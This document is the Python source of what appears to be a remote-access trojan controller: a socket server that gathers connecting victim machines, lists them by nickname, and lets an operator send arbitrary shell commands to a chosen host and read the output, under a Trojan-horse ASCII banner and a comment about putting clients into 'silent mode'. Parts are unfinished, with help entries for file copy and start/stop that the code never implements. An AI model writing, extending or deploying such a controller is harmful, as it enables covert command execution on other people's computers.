import socket
import threading
import json
import os
import time
from tabulate import tabulate



Host = "127.0.0.1"
Port = 6565
client_list=[]
address_list = []





HELP = """
COMMANDS    Usage                            DESCRIPTION
---------   ------------------------------   -----------
connect     connect <NickName>               Connect to Spesific Host
            close                            Close Connection
            ftp <data>                       Copy data inside of ./FTP/
list        list                             Show all Hosts
nick        nick <HostName> <New NickName>   Assign or Change NickName
history     history                          Show Command History
            history <HostName>               Show Command History Used in Spesific Host
start       start <NickName>                 Start Connection
stop        stop <NickName>                  Stop Connection
clear       clear                            Clear Terminal
exit        exit                             Stop Server
"""


HORSE ="""
⠀⠀⠀⠀⠀⠀⢀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣦⡀⠘⣆⠈⠛⠻⣗⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠈⠳⠄⠀⠈⠙⠶⣍⡻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⣷⠀⢷⠀⠀⠀⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⢿⣿⡀⠀⠀⢀⣀⣴⣾⡟⠀⠈⣇⠀⠀⠀⠈⢻⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⡏⠸⣿⣿⣶⣾⣿⡿⠟⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠹⡽⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⠀⠀⠀⣀⡿⠛⠉⠀⠀⢿⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠑⢹⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣷⣶⣾⠏⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡿⠃⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⢀⠀⠹⣿⣿⣿⣿⣷⣶⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⢸⣿⠀⠀⠀⠀⢀⡞⠀⠀⠈⠛⠻⠿⠿⠯⠥⠤⢄⣀⣀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠀⠀⠀⢸⡇⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠈⠙⠂⠙⠳⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⡾⠁⠀⠀⣠⡿⠃⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⡸⠃⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠃⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠙⠻⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⢀⡖⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠀⠀⠀⢸⣿⠀⠀⠈⢿⣿⣿⣿⣿⣿⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⣼⠁⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⣼⡇⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠘⣇⠀⠀⢻⡄⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⢀⣼⠏⠀⣠⣾⣿⣿⡿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⠀⠘⠂⠀⠀⢳⠀⢳⡀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠃⠀⠀⠀⠀⣠⣾⠃⣠⣾⣿⣿⠿⠋⢰⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⢀⣀⡴⠞⠙⠲⣷⡄⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⢀⣀⣠⣤⣶⠿⠟⠋⠀⡾⠀⠀⠀⢀⣴⠟⠁⢠⡟⢱⡿⠃⠀⠀⠸⣇⡀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠟⠁⠀⣀⡤⠖⠋⠁⠀⠀⠀⠀⣸⠇⠀⠀⠀⣤⠟⠑⠋⠉⣿⠋⠉⠉⠉⠁⣠⠞⠀⠀⠀⡇⠀⠀⢠⡿⠋⠀⠀⠈⠁⡿⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⢀⣾⣏⣤⣶⡾⠛⠉⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⣠⠞⠁⠀⠀⠀⠀⣿⠀⠀⠀⢀⡼⠃⠀⠀⠀⢸⠇⠀⣰⠟⠀⠀⠀⠀⠀⠐⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⡾⠃⠀⠀⠀⢀⡞⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣶⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣾⠇⠀⠀⠀⢀⣾⣣⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⢠⡟⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⢀⣀⡀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣾⠇⠀⠀⣰⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⣾⠀⣰⠟⠀⢀⣼⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⢸⣿⣶⠏⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⠃⢠⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢃⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣧⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡟⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠁⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


class colour:
    CC = "\033[34mAT\033[0m"
    help = "\033[34m(help/?)\033[0m"
    arrow = "\033[35m>\033[33m"
    
    def NickName(f):
        return f"\033[34m{f}\033[0m"
    
    def Path(f):
        return f"\033[31m{f}\033[0m"
    
    def info(f):
        return f"\033[32m{f}\033[0m"
    








def data_read():
    try:
        while data_collection:
            with open('./Data/client_list.json') as f:
                global data 
                global data_header
                data = json.load(f)
                data_header = data['client_list'][0].keys()
            time.sleep(1)
    except:
        print(colour.info("[*] There is a problem in JSON data."))
        history_saver("[*] There is a problem in JSON data.")

def start_data_read():
    global data_collection
    data_collection = True
    data_reloader = threading.Thread(target=data_read)
    data_reloader.start()

def stop_data_read():
    global data_collection
    data_collection = False



def history_saver(command):
    with open("./Data/history.txt",'a') as history:
        history.write(f'{command}\n')

def log_saver(HostName,command):
    with open(f"./Data/log/{HostName}.txt",'a') as history:
        history.write(f'{command}\n')

def client_connected(server):
    try:
        while 1:
            sam_client, sam_address = server.accept()
            client_list.append(sam_client)
            address_list.append(sam_address)
    except:
        print(colour.info("[*] Socket sessions closed."))
        history_saver("[*] Socket sessions closed.")














def connect(NickName):
    IP = ''
    for each in data['client_list']:
        if each['NickName'] == NickName:
            IP = each["IP"]
    for client in client_list : 
        raddr = client.getpeername()[0] if client else None
        if raddr == IP :
            print(colour.info(f"[*] Connected to {NickName} !!"))
            history_saver(f"[*] Connected to {NickName} !!")
            command = ''
            client.send(b'connect')
            while command != "close":
                pwd = client.recv(40960).decode('utf-8')
                while True:
                    command = input(f"{colour.CC} {colour.NickName('<'+NickName+'>')} {colour.Path('('+pwd+')')} {colour.arrow} ");print("\033[0m", end='')
                    log_saver(socket.gethostbyaddr(IP)[0],command)
                    if command == "clear" or command == "cls":
                        os.system('cls' if os.name == 'nt' else 'clear')
                    elif command != "":
                        break
                client.send(command.encode('utf-8'))
                output = f"{client.recv(4096000).decode('utf-8')}"
                print(output,end="")
                log_saver(socket.gethostbyaddr(IP)[0],output)

def nick(HostName,NickName):
    for client in data['client_list']:
        if client["HostName"] == HostName:
            history_saver(f"[*] {HostName}'s NickName Changed as: {NickName}")
            print(colour.info(f"[*] {HostName}'s NickName Changed as: {NickName}"))
            client["NickName"] = NickName
            with open('./Data/client_list.json', 'w') as f:
                json.dump(data, f,indent=4)

def close():
    server.close()
    global data_collection
    data_collection = False                
    ### send message to client for go silent mode ###

def lists():
    table = f"{tabulate([list(d.values()) for d in data['client_list']], headers=data_header)}"
    history_saver(table)
    print(f"\n{table}\n")



if __name__ == "__main__":
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((Host,Port))
    server.listen(10)
    client_collector = threading.Thread(target=client_connected,args=(server,))
    client_collector.start()
    
    start_data_read()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[31m{HORSE}\033[0m")
    
    while True :
        
        command = input(f"{colour.CC} {colour.help} {colour.arrow} ");print("\033[0m",end='')
        history_saver(command)
        command = command.split(" ")

        match command[0]:

            case "connect" :
                connect(command[1])
            
            case "list" :
                lists()
            
            case "nick" :
                nick(command[1],command[2])
                
            case "exit":
                close()
                break
            
            case "clear":
                os.system('cls' if os.name == 'nt' else 'clear')

            case "history":
                with open("./Data/history.txt","r") as f:
                    print(f.read())
            
            case "help" : 
                print(HELP)
                
            case "?":
                print(HELP)
                
            case _ :
                print(colour.info('[*] Command not Found'))
                print(HELP)